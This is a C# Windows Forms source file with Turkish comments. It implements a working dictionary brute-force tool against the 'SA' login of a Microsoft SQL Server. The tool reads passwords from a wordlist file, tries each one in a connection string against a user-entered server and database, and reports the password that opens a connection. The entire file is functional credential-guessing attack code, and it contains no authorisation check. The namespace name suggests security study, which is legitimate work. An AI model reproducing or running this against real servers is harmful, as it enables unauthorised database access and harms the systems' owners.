using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace DbSecurity
{
    public partial class FrmBruteForce : Form
    {
        public FrmBruteForce()
        {
            InitializeComponent();
        }

        private void startBtn_Click(object sender, EventArgs e)
        {
            string serverName = txtServerip.Text;
            string userName = "SA";
            string dbName = txtDbname.Text;
            string password;
            string connectionString;

            int passwordCount;
            int clearListCounter = 0;

            // Kullanıcının girdiği sayının geçerli bir sayı olup olmadığını kontrol et
            if (!int.TryParse(txtCount.Text, out passwordCount))
            {
                MessageBox.Show("Lütfen geçerli bir sayı giriniz.");
                return;
            }

            try
            {
                // Dosyayı okumak için using ifadesi kullanmak, işlem bittikten sonra dosyanın otomatik olarak kapatılmasını sağlar.
                using (System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt"))
                {
                    lstPasswordList.Items.Clear(); // Listeyi her denemeden önce temizle

                    // Belirtilen sayıda veya dosyanın sonuna kadar şifreleri oku
                    for (int i = 0; i < passwordCount; i++)
                    {
                        password = sr.ReadLine();

                        // Eğer dosyanın sonuna gelindiyse döngüden çık
                        if (password == null)
                        {
                            break;
                        }

                        lblStatus.Text = $"Denenen Şifre: {password}";
                        lstPasswordList.Items.Add(password);
                        Update(); // Arayüzü güncelle

                        clearListCounter++;

                        // Her 15 denemede bir listeyi temizle (arayüzün çok fazla öğeyle dolmasını önlemek için)
                        if (clearListCounter > 15)
                        {
                            lstPasswordList.Items.Clear();
                            clearListCounter = 0;
                        }

                        // Bağlantı stringini oluştur
                        connectionString = $"DATA SOURCE={serverName};INITIAL CATALOG={dbName};UID={userName};PASSWORD={password};CONNECT TIMEOUT=1";

                        // Yeni bir SqlConnection nesnesi oluştur
                        using (SqlConnection connection = new SqlConnection(connectionString))
                        {
                            try
                            {
                                // Bağlantıyı açmayı dene
                                connection.Open();

                                // Eğer bağlantı başarılıysa doğru şifreyi bulduk demektir
                                if (connection.State == ConnectionState.Open)
                                {
                                    lblStatus.Text = $"Bağlantı Başarılı! Şifre: {password}";
                                    return; // Doğru şifre bulunduğunda fonksiyondan çık
                                }
                            }
                            catch (SqlException ex)
                            {
                                // Bağlantı başarısız olursa bu kısma düşer (yanlış şifre veya bağlantı hatası)
                                // Hata mesajını göstermeye gerek yok, bir sonraki şifreyi deneyecek
                                // İstenirse hatalar loglanabilir veya farklı bir şekilde işlenebilir.
                                Console.WriteLine($"Bağlantı Hatası: {ex.Message}");
                            }
                        }
                    }

                    // Döngü tamamlandıysa ve doğru şifre bulunamadıysa kullanıcıya bilgi ver
                    lblStatus.Text = "Belirtilen şifreler arasında doğru şifre bulunamadı.";
                }
            }
            catch (System.IO.FileNotFoundException)
            {
                MessageBox.Show("Belirtilen 'uniqpass_preview.txt' dosyası bulunamadı.");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Bir hata oluştu: {ex.Message}");
            }
        }
    }
}